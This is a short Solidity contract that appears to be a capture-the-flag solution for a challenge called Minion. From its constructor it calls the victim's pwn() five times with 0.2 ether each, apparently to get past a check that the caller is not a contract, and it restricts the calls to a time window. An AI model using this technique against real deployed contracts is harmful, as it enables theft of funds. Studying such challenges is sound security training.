// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IMinion {
    function timeVal() external view returns (uint256);

    function pwn() external payable;

    function retrieve() external;

    function verify(address account) external view returns (bool);
}

contract MinionSolution {
    IMinion public victim;

    constructor(address victim_) payable {
        victim = IMinion(victim_);

        require(msg.value == 1 ether, "Need one ether to pwn");
        require(victim.timeVal() % 120 >= 0 && victim.timeVal() % 120 < 60, "Bad time");

        // 1 ether in total
        victim.pwn{ value: 0.2 ether }();
        victim.pwn{ value: 0.2 ether }();
        victim.pwn{ value: 0.2 ether }();
        victim.pwn{ value: 0.2 ether }();
        victim.pwn{ value: 0.2 ether }();

        require(victim.verify(address(this)), "Not pwnd!");
    }

    function isPwnd() external view returns (bool) {
        return victim.verify(address(this));
    }
}
